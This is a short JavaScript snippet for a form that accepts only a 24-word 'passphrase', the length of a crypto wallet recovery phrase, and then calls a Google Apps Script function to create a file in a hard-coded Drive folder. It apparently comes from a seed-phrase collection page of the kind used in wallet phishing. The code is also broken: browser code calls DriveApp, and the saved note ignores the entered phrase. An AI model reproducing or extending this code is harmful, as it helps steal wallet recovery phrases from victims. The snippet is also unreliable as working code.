// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1')
    myButton.disabled = true;

    const myButton2 = document.getElementById('b2')
    myButton2.disabled = true;
    // Step 1: Get the value of the hidden input field with name 'mf-texts'
    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        const errorElement = document.getElementById('emsg');
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Step 2: Create a note file in Google Drive
    createNoteFile();
}
// Function to create a note file in Google Drive
function createNoteFile() {
    var folderId = "1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q"; // Your Google Drive folder ID
    var folder = DriveApp.getFolderById(folderId); 
    
    var fileName = "MyNote.txt";
    var fileContent = "This is an automatically created note file.";
    
    var file = folder.createFile(fileName, fileContent);
    
    Logger.log("File created successfully: " + file.getUrl());
}

